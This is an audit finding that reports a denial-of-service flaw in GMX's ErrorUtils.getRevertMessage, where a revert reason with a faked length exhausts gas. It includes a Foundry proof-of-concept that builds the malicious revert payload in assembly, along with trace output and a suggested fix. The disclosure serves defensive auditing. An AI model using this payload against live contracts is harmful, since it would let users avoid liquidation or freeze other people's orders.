IllIllI

high

# Malicious revert reasons with faked lengths can disrupt order execution

## Summary

Malicious revert reasons with faked lengths can be used in the various order callbacks to disrupt order execution


## Vulnerability Detail

For most order-related operations, the user is allowed to provide the address of a contract on which a callback is triggered, whenever anything related to an order changes. These callbacks are executed with a limited amount of gas, under a try-catch block, in order to ensure that the user-supplied callback cannot affect subsequent processing. Whenever the callback reverts, the revert reason is fetched so that it can be emitted.

The code that parses the return bytes uses `abi.decode(result, (string))` to parse the "string", which relies on the first word of the data, to figure out how many bytes long the string is. Because the `results` variable is a memory variable, rather than calldata, any read past the end of the bytes is allowed, and is considered as value zero byte slots. If a malicious callback provides a reason "string" that is only a few bytes long, but sets the length to a very large number, when the decode call is made, it will try to read a string of that provided length, and will eventually run out of gas.

Note that this is not the same as providing an actual long string, because in that case, the callback will revert with an out of gas error, and there won't be a string to parse.


## Impact

A malicious user can use this attack in many different places, but they all stem from the bug in `ErrorUtils.getRevertMessage()`. One such attack would be that a user can prevent themselves from being liquidated or ADLed, by providing a malicious string in the revert reason in their [CallbackUtils.afterOrderExecution()](https://github.com/sherlock-audit/2023-02-gmx/blob/main/gmx-synthetics/contracts/order/OrderUtils.sol#L168) callback.

Othere places include the freezing of orders, bypassing pauses by having resting orders that can never execute until allowed, and preventing orders from being canceled when their normal execution reverts.


## Code Snippet

The input `result` is a memory variable, and it uses `abi.decode()` without checking the string's length against the calldata length, or any sort of maximum:
```solidity
// File: gmx-synthetics/contracts/utils/ErrorUtils.sol : ErrorUtils.getRevertMessage()   #1

6         // To get the revert reason, referenced from https://ethereum.stackexchange.com/a/83577
7  @>     function getRevertMessage(bytes memory result) internal pure returns (string memory, bool) {
8             // If the result length is less than 68, then the transaction either panicked or failed silently
9             if (result.length < 68) {
10                return ("", false);
11            }
12    
13            bytes4 errorSelector = getErrorSelectorFromData(result);
14    
15            // 0x08c379a0 is the selector for Error(string)
16            // referenced from https://blog.soliditylang.org/2021/04/21/custom-errors/
17            if (errorSelector == bytes4(0x08c379a0)) {
18                assembly {
19                    result := add(result, 0x04)
20                }
21    
22 @>             return (abi.decode(result, (string)), true);
23            }
24    
25            // error may be a custom error, return an empty string for this case
26            return ("", false);
27:       }
```
https://github.com/sherlock-audit/2023-02-gmx/blob/main/gmx-synthetics/contracts/utils/ErrorUtils.sol#L7-L27


The following test shows how this can be used to cause a revert, even when the gas to the callback is limited. I show two cases - one where there is no external wrapping of the calldata, and one where there is. Most of the examples of `getRevertMessage()` are the unwrapped variety, but some like the ones for `executeDeposit()` and `executeWithdrawal()` are wrapped, and would require the attack to also be applied to the cancellation callback, since those are unwrapped:


```solidity
pragma solidity 0.8.17;

import "forge-std/Test.sol";

contract BigString is Test {

    function test_unwrapped() external view returns (uint256) {
        try this.strFakedString{gas:10240}() {
        //try this.strFakedString() {
        //try this.strBigString{gas:10240}() {
        //try this.strNoIssue() {
        } catch (bytes memory reasonBytes) {
            (string memory reason, /* bool hasRevertMessage */) = getRevertMessage(reasonBytes);
            return 1;
        }
        return 0;
    }
    
    function test_wrapped() external view returns (uint256) {
        try this.test_unwrapped() {
        } catch (bytes memory reasonBytes) {
            (string memory reason, /* bool hasRevertMessage */) = getRevertMessage(reasonBytes);
            return 1;
        }
        return 0;
    }

    function strNoIssue() external pure returns (string memory) {
        assembly {
            mstore(0, 0x20)
            mstore(0x27, 0x07536561706f7274)
            revert(0, 0x60)
        }
    }
    function strBigString() external pure returns (string memory) {
        bytes memory str = new bytes(100000000000);
	revert(string(str));
    }

    function strFakedString() external pure returns (string memory) {
        assembly {
            let free_mem_ptr := mload(64)
            mstore(free_mem_ptr, 0x08c379a000000000000000000000000000000000000000000000000000000000)
            mstore(add(free_mem_ptr, 4), 32)
            //mstore(add(free_mem_ptr, 36), 12) // original
            mstore(add(free_mem_ptr, 36), 100000000000) // out of gas
            mstore(add(free_mem_ptr, 68), "Unauthorizedzzzzzz")
            revert(free_mem_ptr, 100)
        }
    }

    function getErrorSelectorFromData(bytes memory data) internal pure returns (bytes4) {
        bytes4 errorSelector;

        assembly {
            errorSelector := mload(add(data, 0x20))
        }

        return errorSelector;
    }
    // To get the revert reason, referenced from https://ethereum.stackexchange.com/a/83577
    function getRevertMessage(bytes memory result) internal pure returns (string memory, bool) {
        // If the result length is less than 68, then the transaction either panicked or failed silently
        if (result.length < 68) {
            return ("", false);
        }

        bytes4 errorSelector = getErrorSelectorFromData(result);

        // 0x08c379a0 is the selector for Error(string)
        // referenced from https://blog.soliditylang.org/2021/04/21/custom-errors/
        if (errorSelector == bytes4(0x08c379a0)) {
            assembly {
                result := add(result, 0x04)
            }

            return (abi.decode(result, (string)), true);
        }

        // error may be a custom error, return an empty string for this case
        return ("", false);
    }
}
```

Output:

```shell
$ forge test -vvvv
[⠰] Compiling...
No files changed, compilation skipped

Running 2 tests for src/T.sol:BigString
[FAIL. Reason: EvmError: OutOfGas] test_unwrapped():(uint256) (gas: 9223372036854754743)
Traces:
  [2220884625] BigString::test_unwrapped() 
    ├─ [257] BigString::strFakedString() [staticcall]
    │   └─ ← 0x08c379a00000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000174876e800556e617574686f72697a65647a7a7a7a7a7a0000000000000000000000000000
    └─ ← "EvmError: OutOfGas"

[PASS] test_wrapped():(uint256) (gas: 9079256848778899476)
Traces:
  [9079256848778899476] BigString::test_wrapped() 
    ├─ [2220884625] BigString::test_unwrapped() [staticcall]
    │   ├─ [257] BigString::strFakedString() [staticcall]
    │   │   └─ ← 0x08c379a00000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000174876e800556e617574686f72697a65647a7a7a7a7a7a0000000000000000000000000000
    │   └─ ← "EvmError: OutOfGas"
    └─ ← 1

Test result: FAILED. 1 passed; 1 failed; finished in 628.44ms

Failing tests:
Encountered 1 failing test in src/T.sol:BigString
[FAIL. Reason: EvmError: OutOfGas] test_unwrapped():(uint256) (gas: 9223372036854754743)

Encountered a total of 1 failing tests, 1 tests succeeded
```

## Tool used

Manual Review


## Recommendation

Have an upper limit on the length of a string that can be passed back, and manually update the length if the string's stated length is greater than the max.


